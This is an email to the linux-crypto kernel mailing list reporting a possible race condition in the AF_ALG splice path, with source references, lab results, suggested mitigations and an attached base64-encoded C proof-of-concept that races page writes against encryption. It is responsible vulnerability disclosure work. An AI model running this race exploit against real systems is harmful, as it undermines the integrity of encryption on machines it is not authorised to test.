Received: from mail-07.mail-europe.com (mail-07.mail-europe.com [188.165.51.139])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 071FE223DE5
	for <linux-crypto@vger.kernel.org>; Sat,  2 May 2026 15:47:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=188.165.51.139
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1777736844; cv=none; b=fFtypgbndsHhxCVnvNtGsbKIimrbPuDRlmn0TE3SZECNZCOMkT9eZoldE8nArPC7ZMAEnBYxi6qnsvXG9JZp07BY4/DDE9USaqynB9cLz9Ae/760+kWrXC6w1702e5iPYhozGv782urat292o3K68DJIrs7YzLXM0eXAbNgOoSA=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1777736844; c=relaxed/simple;
	bh=npaTwN3bFqF9dc7RiHO4BAyb+tm0OGhOHy7zaPgFTyw=;
	h=Date:To:From:Cc:Subject:Message-ID:MIME-Version:Content-Type; b=IdRZV+uMieuoglVVO6iSW8Il31nwUTgNNtv64/PZ1qPkEhiu0sXGA1Yaijj9i2ZICUg7Z2XP8M9ZU7YgvAobaWSOCToc3JRGULkKf+bSk1sSI70KRTN0AfgHtkABoz6ubQzrHSVN+4M8IoWbVZpK7f6Zg85VVI3N4mmumdrHH/I=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai; spf=pass smtp.mailfrom=innora.ai; dkim=pass (2048-bit key) header.d=innora.ai header.i=@innora.ai header.b=oZ1SGUsC; arc=none smtp.client-ip=188.165.51.139
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=innora.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=innora.ai header.i=@innora.ai header.b="oZ1SGUsC"
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=innora.ai;
	s=protonmail2; t=1777736830; x=1777996030;
	bh=kg4nJMAp540uyd1Y/WiQhbZcKSX89OHO+bWSr/VEe3E=;
	h=Date:To:From:Cc:Subject:Message-ID:Feedback-ID:From:To:Cc:Date:
	 Subject:Reply-To:Feedback-ID:Message-ID:BIMI-Selector;
	b=oZ1SGUsCib7W9foQhx+pDTNYPOaRNPOETY0k+q8Jrhj7rwJi0yPbymRXL/PXlWWXw
	 nKYCxQ3i9yqPKSr5XBIW6/3iwTofkved8+6UiVkSqlV9mXuHtZfPpLKndCzQ80Sj0j
	 6XYnIeVbO70iarIoHZEvg0rD7usAMQ2xc5PN3lKfRxXn4zYqT1sKj5RYGaoyYgrpLW
	 SoIx9TYLIRUYDup2hbkCVDgKFM9kFFuIFFKLZ0Cukgm88MdmLwk4BCBuySORs8TUh2
	 WoNZfvzOOLLJnyTiavjkv4n5ykBFO4J04Js/R7XTIxn1cFWE++bMoStNnmVKo3EyQW
	 5U9KZUrpxlA4g==
Date: Sat, 02 May 2026 15:47:03 +0000
To: linux-crypto@vger.kernel.org
From: Feng Ning <feng@innora.ai>
Cc: herbert@gondor.apana.org.au
Subject: [Possible vulnerability] crypto/af_alg: extract_bvec_to_sg() retains spliced pipe pages in TX SGL without sendpage_ok() check
Message-ID: <afYcc-tZFwvZZo76@ans-MacBook-Pro.local>
Feedback-ID: 140578448:user:proton
X-Pm-Message-ID: 2979b44d91a4053fdb80aa8d0c2fb98096a19678
Precedence: bulk
X-Mailing-List: linux-crypto@vger.kernel.org
List-Id: <linux-crypto.vger.kernel.org>
List-Subscribe: <mailto:linux-crypto+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-crypto+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g"

--b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g
Content-Type: text/plain; charset=utf-8
Content-Transfer-Encoding: quoted-printable

[Possible vulnerability] crypto/af_alg: extract_bvec_to_sg() retains splice=
d pipe pages in TX SGL without sendpage_ok() check

Hello kernel security team & linux-crypto,

This is a follow-up to CVE-2026-31431 ("Copy Fail") fixed by

    a664bf3d603d crypto: algif_aead - Revert to operating out-of-place

We have identified that the underlying primitive =E2=80=94 extract_iter_to_=
sg()
with ITER_BVEC backend in lib/scatterlist.c =E2=80=94 does not perform a
sendpage_ok() / page->mapping filter when transferring pipe pages
into a permanent scatterlist. This makes the AF_ALG path
(crypto/af_alg.c MSG_SPLICE_PAGES branch) retain attacker-controlled
pipe pages in the TX SGL until recvmsg(), creating a TOCTOU race window
during which crypto subsystem reads of the SGL observe attacker-mutated
page content.

In contrast, skb_splice_from_iter() (net/core/skbuff.c) does include a
WARN_ON_ONCE(!sendpage_ok(page)) check before persisting the page.

Source anchors (verified against mainline HEAD 08d0d3466664):
  - lib/scatterlist.c: extract_bvec_to_sg() at lines 1166-1205
  - crypto/af_alg.c: MSG_SPLICE_PAGES branch at lines 1020-1040
  - crypto/algif_skcipher.c: skcipher_request_set_crypt() at line 161

PoC results (lab-only, attached as poc-k02-splice-afalg.c):
  - Tested kernel: Linux 6.8.0-110-generic (Ubuntu 24.04, x86_64)
  - Algorithm: skcipher / "ecb(aes)"
  - Race: vmsplice(SPLICE_F_GIFT) -> splice -> AF_ALG opfd; race writer
    XOR-flips page bytes between splice() and recvmsg()
  - Result: 5 stable runs, mean 5.6 race-affected ciphertexts per
    500 rounds (1.1% race hit rate)
  - Build: gcc -pthread -o poc poc-k02-splice-afalg.c
  - Run:   ./poc

Independent inner-template audit (44 crypto/*.c templates and
drivers/crypto/) confirms that under the post-a664bf3d603d state, no
inner template sub-path writes back to req->src in user-space flows.
Severity is therefore confined to ciphertext integrity (race window)
under default software crypto. Hardware crypto offload paths
(CAAM/OMAP/Atmel/CAAM) gate in-place on req->src =3D=3D req->dst, which
the current algif_* surface no longer satisfies. Privilege escalation
under the software path was not demonstrated.

Suggested mitigation:
  - Add sendpage_ok() check (or stronger: page->mapping =3D=3D NULL ||
    PageAnon(page)) inside extract_bvec_to_sg() in lib/scatterlist.c,
    optionally behind an iov_iter_extraction_t flag if performance
    sensitive.
  - Alternative: copy pipe pages instead of retaining via get_page()
    for the AF_ALG callsites specifically.

We are not requesting a CVE for this report at this time and welcome
your assessment of severity.

Reporter:
  Feng Ning <feng@innora.ai>
  PGP fingerprint: 7D1A285EF3FE907C1594FA292E73300F628AE89E
  (please encrypt any sensitive reply against this key)

Best regards,
Feng Ning

--b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g
Content-Type: text/plain; charset=utf-8; name=poc-k02-splice-afalg.c
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename=poc-k02-splice-afalg.c

LyoNCiAqIEstMDIgUG9DIHYyOiBBRl9BTEcgc3BsaWNlIFRPQ1RPVSDigJQgc2ltcGxpZmllZCwg
c2luZ2xlLW9wZmQNCiAqDQogKiBUaGVvcnk6IHZtc3BsaWNlKFNQTElDRV9GX0dJRlQpIHB1dHMg
dXNlciBwYWdlIGludG8gcGlwZS4NCiAqICAgICAgICAgc3BsaWNlKHBpcGUgLT4gQUZfQUxHIG9w
ZmQpIGV4dHJhY3RzIHBpcGUgcGFnZSBpbnRvIFNHTA0KICogICAgICAgICB2aWEgZXh0cmFjdF9p
dGVyX3RvX3NnKCkgLT4gZ2V0X3BhZ2UoKS4NCiAqICAgICAgICAgSWYgcGFnZSBpcyByZXRhaW5l
ZCAobm90IGNvcGllZCksIHJhY2Ugd3JpdGVyIG1vZGlmeWluZw0KICogICAgICAgICB0aGUgcGFn
ZSBiZXR3ZWVuIHNwbGljZSgpIGFuZCByZWN2bXNnKCkgY2hhbmdlcyBjaXBoZXJ0ZXh0Lg0KICov
DQojZGVmaW5lIF9HTlVfU09VUkNFDQojaW5jbHVkZSA8c3RkaW8uaD4NCiNpbmNsdWRlIDxzdGRs
aWIuaD4NCiNpbmNsdWRlIDxzdHJpbmcuaD4NCiNpbmNsdWRlIDx1bmlzdGQuaD4NCiNpbmNsdWRl
IDxmY250bC5oPg0KI2luY2x1ZGUgPHN5cy9zb2NrZXQuaD4NCiNpbmNsdWRlIDxzeXMvdWlvLmg+
DQojaW5jbHVkZSA8c3lzL21tYW4uaD4NCiNpbmNsdWRlIDxsaW51eC9pZl9hbGcuaD4NCiNpbmNs
dWRlIDxwdGhyZWFkLmg+DQojaW5jbHVkZSA8c3RkaW50Lmg+DQoNCiNkZWZpbmUgQkxPQ0sgMTYN
Cg0Kc3RhdGljIGludCBhZmFsZ19zZXR1cChjb25zdCBjaGFyICpuYW1lLCBjb25zdCB1bnNpZ25l
ZCBjaGFyICprZXksIGludCBrbGVuKQ0Kew0KICAgIGludCB0Zm0gPSBzb2NrZXQoQUZfQUxHLCBT
T0NLX1NFUVBBQ0tFVCwgMCk7DQogICAgaWYgKHRmbSA8IDApIHsgcGVycm9yKCJzb2NrZXQiKTsg
cmV0dXJuIC0xOyB9DQoNCiAgICBzdHJ1Y3Qgc29ja2FkZHJfYWxnIHNhID0geyAuc2FsZ19mYW1p
bHkgPSBBRl9BTEcsIC5zYWxnX3R5cGUgPSAic2tjaXBoZXIiIH07DQogICAgc3RybmNweSgoY2hh
ciopc2Euc2FsZ19uYW1lLCBuYW1lLCBzaXplb2Yoc2Euc2FsZ19uYW1lKS0xKTsNCiAgICBpZiAo
YmluZCh0Zm0sIChzdHJ1Y3Qgc29ja2FkZHIgKikmc2EsIHNpemVvZihzYSkpIDwgMCkgew0KICAg
ICAgICBwZXJyb3IoImJpbmQiKTsgY2xvc2UodGZtKTsgcmV0dXJuIC0xOw0KICAgIH0NCiAgICBp
ZiAoc2V0c29ja29wdCh0Zm0sIFNPTF9BTEcsIEFMR19TRVRfS0VZLCBrZXksIGtsZW4pIDwgMCkg
ew0KICAgICAgICBwZXJyb3IoInNldHNvY2tvcHQgS0VZIik7IGNsb3NlKHRmbSk7IHJldHVybiAt
MTsNCiAgICB9DQogICAgcmV0dXJuIHRmbTsNCn0NCg0Kc3RhdGljIHZvaWQgZW5jcnlwdF9yZWYo
aW50IG9wZmQsIGNvbnN0IHVuc2lnbmVkIGNoYXIgKmluLA0KICAgICAgICAgICAgICAgICAgICAg
ICAgdW5zaWduZWQgY2hhciAqb3V0LCBzaXplX3QgbGVuKQ0Kew0KICAgIHN0cnVjdCBpb3ZlYyBp
b3YgPSB7ICh2b2lkKilpbiwgbGVuIH07DQogICAgc3RydWN0IG1zZ2hkciBtc2cgPSB7IC5tc2df
aW92ID0gJmlvdiwgLm1zZ19pb3ZsZW4gPSAxIH07DQogICAgaWYgKHNlbmRtc2cob3BmZCwgJm1z
ZywgMCkgIT0gKHNzaXplX3QpbGVuKSB7IHBlcnJvcigic2VuZG1zZyByZWYiKTsgcmV0dXJuOyB9
DQogICAgaW92Lmlvdl9iYXNlID0gb3V0OyBpb3YuaW92X2xlbiA9IGxlbjsNCiAgICBpZiAocmVj
dm1zZyhvcGZkLCAmbXNnLCAwKSAhPSAoc3NpemVfdClsZW4pIHsgcGVycm9yKCJyZWN2bXNnIHJl
ZiIpOyB9DQp9DQoNCnN0YXRpYyB2b2xhdGlsZSBpbnQgcmFjZV9nbzsNCg0Kc3RhdGljIHZvaWQg
KnJhY2VfdGhyZWFkKHZvaWQgKmFyZykNCnsNCiAgICB1bnNpZ25lZCBjaGFyICpwYWdlID0gYXJn
Ow0KICAgIHdoaWxlICghcmFjZV9nbykgX19zeW5jX3N5bmNocm9uaXplKCk7DQogICAgZm9yIChp
bnQgaSA9IDA7IGkgPCA1MDAwMDsgaSsrKSB7DQogICAgICAgIHBhZ2VbMF0gXj0gMHhGRjsNCiAg
ICAgICAgX19zeW5jX3N5bmNocm9uaXplKCk7DQogICAgfQ0KICAgIHJldHVybiBOVUxMOw0KfQ0K
DQppbnQgbWFpbih2b2lkKQ0Kew0KICAgIHVuc2lnbmVkIGNoYXIga2V5W0JMT0NLXSA9IHsweDAs
MHgxLDB4MiwweDMsMHg0LDB4NSwweDYsMHg3LA0KICAgICAgICAgICAgICAgICAgICAgICAgICAg
ICAgICAweDgsMHg5LDB4QSwweEIsMHhDLDB4RCwweEUsMHhGfTsNCiAgICB1bnNpZ25lZCBjaGFy
IHB0W0JMT0NLXSAgPSB7MHgwMCwweDExLDB4MjIsMHgzMywweDQ0LDB4NTUsMHg2NiwweDc3LA0K
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAweDg4LDB4OTksMHhBQSwweEJCLDB4Q0Ms
MHhERCwweEVFLDB4RkZ9Ow0KICAgIHVuc2lnbmVkIGNoYXIgcmVmW0JMT0NLXSwgYnVmW0JMT0NL
XTsNCiAgICBpbnQgdGZtLCBvcGZkLCBwaXBlZmRbMl07DQoNCiAgICBwcmludGYoIlsrXSBLLTAy
IFBvQzogQUZfQUxHIHNwbGljZSBUT0NUT1VcbiIpOw0KDQogICAgdGZtID0gYWZhbGdfc2V0dXAo
ImVjYihhZXMpIiwga2V5LCBCTE9DSyk7DQogICAgaWYgKHRmbSA8IDApIHJldHVybiAxOw0KDQog
ICAgLyogcmVmZXJlbmNlIGNpcGhlcnRleHQgdmlhIG5vcm1hbCBzZW5kbXNnL3JlY3Ztc2cgKi8N
CiAgICBvcGZkID0gYWNjZXB0KHRmbSwgTlVMTCwgMCk7DQogICAgaWYgKG9wZmQgPCAwKSB7IHBl
cnJvcigiYWNjZXB0Iik7IHJldHVybiAxOyB9DQogICAgZW5jcnlwdF9yZWYob3BmZCwgcHQsIHJl
ZiwgQkxPQ0spOw0KICAgIHByaW50ZigiWytdIFJlZmVyZW5jZSBjaXBoZXJ0ZXh0IGNvbXB1dGVk
XG4iKTsNCiAgICBjbG9zZShvcGZkKTsNCg0KICAgIC8qIGFsbG9jYXRlIHBhZ2UtYWxpZ25lZCBi
dWZmZXIgKi8NCiAgICB1bnNpZ25lZCBjaGFyICpwYWdlID0gbW1hcChOVUxMLCA0MDk2LCBQUk9U
X1JFQUR8UFJPVF9XUklURSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNQVBfUFJJ
VkFURXxNQVBfQU5PTllNT1VTLCAtMSwgMCk7DQogICAgaWYgKHBhZ2UgPT0gTUFQX0ZBSUxFRCkg
eyBwZXJyb3IoIm1tYXAiKTsgcmV0dXJuIDE7IH0NCg0KICAgIGlmIChwaXBlKHBpcGVmZCkgPCAw
KSB7IHBlcnJvcigicGlwZSIpOyByZXR1cm4gMTsgfQ0KDQogICAgaW50IGhpdHMgPSAwLCByb3Vu
ZHMgPSA1MDA7DQogICAgZm9yIChpbnQgciA9IDA7IHIgPCByb3VuZHM7IHIrKykgew0KICAgICAg
ICBtZW1jcHkocGFnZSwgcHQsIEJMT0NLKTsNCg0KICAgICAgICBvcGZkID0gYWNjZXB0KHRmbSwg
TlVMTCwgMCk7DQogICAgICAgIGlmIChvcGZkIDwgMCkgY29udGludWU7DQoNCiAgICAgICAgLyog
dm1zcGxpY2U6IHVzZXIgcGFnZSAtPiBwaXBlICh6ZXJvLWNvcHkgd2l0aCBTUExJQ0VfRl9HSUZU
KSAqLw0KICAgICAgICBzdHJ1Y3QgaW92ZWMgaW92ID0geyBwYWdlLCBCTE9DSyB9Ow0KICAgICAg
ICBpZiAodm1zcGxpY2UocGlwZWZkWzFdLCAmaW92LCAxLCBTUExJQ0VfRl9HSUZUKSA8IDApIHsN
CiAgICAgICAgICAgIC8qIEdpZnQgZmFpbGVkIChwYWdlIG5vdCBzdWl0YWJsZSksIGRvIGNvcHkg
Ki8NCiAgICAgICAgICAgIGlmICh2bXNwbGljZShwaXBlZmRbMV0sICZpb3YsIDEsIDApIDwgMCkg
ew0KICAgICAgICAgICAgICAgIHBlcnJvcigidm1zcGxpY2UiKTsgY2xvc2Uob3BmZCk7IGNvbnRp
bnVlOw0KICAgICAgICAgICAgfQ0KICAgICAgICB9DQoNCiAgICAgICAgLyogc3BsaWNlOiBwaXBl
IC0+IEFGX0FMRyAoc2VuZG1zZyBlcXVpdmFsZW50KSAqLw0KICAgICAgICBpZiAoc3BsaWNlKHBp
cGVmZFswXSwgTlVMTCwgb3BmZCwgTlVMTCwgQkxPQ0ssDQogICAgICAgICAgICAgICAgICAgU1BM
SUNFX0ZfTU9WRSB8IFNQTElDRV9GX01PUkUpIDwgMCkgew0KICAgICAgICAgICAgcGVycm9yKCJz
cGxpY2UiKTsgY2xvc2Uob3BmZCk7IGNvbnRpbnVlOw0KICAgICAgICB9DQoNCiAgICAgICAgLyog
U3RhcnQgcmFjZSB3cml0ZXIgKi8NCiAgICAgICAgcmFjZV9nbyA9IDA7DQogICAgICAgIHB0aHJl
YWRfdCB0aHI7DQogICAgICAgIHB0aHJlYWRfY3JlYXRlKCZ0aHIsIE5VTEwsIHJhY2VfdGhyZWFk
LCBwYWdlKTsNCiAgICAgICAgcmFjZV9nbyA9IDE7ICAvKiBsZXQgd3JpdGVyIHN0YXJ0IGFmdGVy
IHNwbGljZSwgYmVmb3JlIHJlY3Ztc2cgKi8NCg0KICAgICAgICAvKiByZWN2bXNnOiByZWFkIGNp
cGhlcnRleHQgKi8NCiAgICAgICAgc3RydWN0IGlvdmVjIGlvdl9yeCA9IHsgYnVmLCBCTE9DSyB9
Ow0KICAgICAgICBzdHJ1Y3QgbXNnaGRyIG1zZyA9IHsgLm1zZ19pb3YgPSAmaW92X3J4LCAubXNn
X2lvdmxlbiA9IDEgfTsNCiAgICAgICAgc3NpemVfdCBuID0gcmVjdm1zZyhvcGZkLCAmbXNnLCAw
KTsNCg0KICAgICAgICBwdGhyZWFkX2pvaW4odGhyLCBOVUxMKTsNCiAgICAgICAgY2xvc2Uob3Bm
ZCk7DQoNCiAgICAgICAgaWYgKG4gPT0gQkxPQ0sgJiYgbWVtY21wKGJ1ZiwgcmVmLCBCTE9DSykg
IT0gMCkgew0KICAgICAgICAgICAgaGl0cysrOw0KICAgICAgICAgICAgaWYgKGhpdHMgPD0gMykg
ew0KICAgICAgICAgICAgICAgIHByaW50ZigiWyFdIFJPVU5EICVkOiBNSVNNQVRDSCFcbiIsIHIp
Ow0KICAgICAgICAgICAgICAgIHByaW50ZigiICByZWY6ICIpOyBmb3IoaW50IGk9MDtpPEJMT0NL
O2krKykgcHJpbnRmKCIlMDJ4IixyZWZbaV0pOyBwcmludGYoIlxuIik7DQogICAgICAgICAgICAg
ICAgcHJpbnRmKCIgIGdvdDogIik7IGZvcihpbnQgaT0wO2k8QkxPQ0s7aSsrKSBwcmludGYoIiUw
MngiLGJ1ZltpXSk7IHByaW50ZigiXG4iKTsNCiAgICAgICAgICAgIH0NCiAgICAgICAgfQ0KICAg
IH0NCg0KICAgIHByaW50ZigiWytdICVkLyVkIHJvdW5kcywgJWQgVE9DVE9VIGhpdHNcbiIsIHJv
dW5kcywgcm91bmRzLCBoaXRzKTsNCiAgICBwcmludGYoIlsrXSBWZXJkaWN0OiAlc1xuIiwgaGl0
cyA+IDANCiAgICAgICAgICAgPyAiVlVMTkVSQUJMRSDigJQgc3BsaWNlIHBpcGUgcGFnZSByZXRh
aW5lZCBpbiBBRl9BTEcgU0dMIg0KICAgICAgICAgICA6ICJObyBUT0NUT1UgaW4gdGhpcyBydW4g
KG1heSBuZWVkIEtBU0FOIGtlcm5lbCArIHBhZ2VjYWNoZSBwYWdlKSIpOw0KDQogICAgbXVubWFw
KHBhZ2UsIDQwOTYpOw0KICAgIGNsb3NlKHBpcGVmZFswXSk7IGNsb3NlKHBpcGVmZFsxXSk7IGNs
b3NlKHRmbSk7DQogICAgcmV0dXJuIChoaXRzID4gMCkgPyAwIDogMTsNCn0NCg==

--b1=_YfktIp7CAqY3dotbWLZadBpCS7y7MGd4Y8aoE0g--

